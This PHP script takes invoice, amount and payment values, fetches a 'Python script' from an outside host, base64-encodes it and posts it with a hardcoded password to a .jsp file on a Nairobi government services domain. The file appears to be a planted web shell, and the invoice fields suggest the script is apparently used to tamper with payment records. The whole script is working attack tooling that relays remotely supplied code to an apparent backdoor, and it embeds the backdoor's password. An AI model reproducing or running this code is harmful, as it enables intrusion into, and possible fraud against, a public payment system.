<?php
// API URLs
if (!isset($_POST['route'])) {
    die('Route unspecified!');
} elseif ($_POST['route'] == 'bank') {
    $firstApiUrl = 'https://kever.io/eng2_process.php';
} elseif ($_POST['route'] == 'mpesa') {
    $firstApiUrl = 'https://kever.io/eng4_process.php';
} else {
    die('Unknown route specified!');
}

if (!isset($_POST['invoiceNo']) || !isset($_POST['amount']) || !isset($_POST['pay'])) {
    echo json_encode(['error' => 'incomplete request', 'payload' => $_POST]);
    die();
}

if (empty($_POST['invoiceNo']) || empty($_POST['amount'] || empty($_POST['pay']))) {
    echo json_encode(['error' => 'empty request', 'payload' => $_POST]);
    die();
}

$invoice_no = $_POST['invoiceNo'];
$amount = $_POST['amount'];
$pay = $_POST['pay'];

$secondApiUrl = 'https://edev.nairobiservices.go.ke/api/maps/docs/netspi/konka.jsp';

// Step 1: Call the first API to get the Python script
$firstApiResponse = callFirstApi($firstApiUrl,$invoice_no,$amount, $pay);

// Check if the response from the first API is valid
if ($firstApiResponse === false || empty($firstApiResponse)) {
    die('Error fetching the Python script from the first API.');
}

// Validate the size of the response
$responseSize = strlen($firstApiResponse); // Get size in bytes
if ($responseSize < 1536) {
    die('The script is invalid as it is less than 1.5 KB in size.<br/><br/>'.$firstApiResponse);
}
echo $firstApiResponse.'<br/><br/>';

// Step 2: Base64 encode the response
$encodedScript = base64_encode($firstApiResponse);

// Prepare the required fields for the second API
$password = 'TheHermitKingdom2024__';
$data = [
    'password' => $password,
    'script' => $encodedScript
];

// Step 3: Call the second API with the base64 encoded script
$secondApiResponse = callSecondApi($secondApiUrl, $data);

// Output the response from the second API
echo $secondApiResponse;

/**
 * Function to call the first API
 *
 * @param string $url API URL
 * @return string|bool API response or false on failure
 */
function callFirstApi($url,$invoice_no,$amount, $pay)
{
    $ch = curl_init();

    $postData = [
        'invoiceNo' => $invoice_no,
        'amount' => $amount,
        'pay' => $pay
    ];

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Cookie: visitorId=973ad0dd0c565ca2ae839d5ebef8447a'
    ]);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'CURL Error: ' . curl_error($ch);
        curl_close($ch);
        return false;
    }

    curl_close($ch);
    return $response;
}

/**
 * Function to call the second API
 *
 * @param string $url API URL
 * @param array $data Data to send in the POST request
 * @return string API response
 */
function callSecondApi($url, $data)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded; charset=UTF-8'
    ]);

    $response = curl_exec($ch);

    if (curl_errno($ch)) {
        echo 'CURL Error: ' . curl_error($ch);
        curl_close($ch);
        return false;
    }

    curl_close($ch);
    return $response;
}
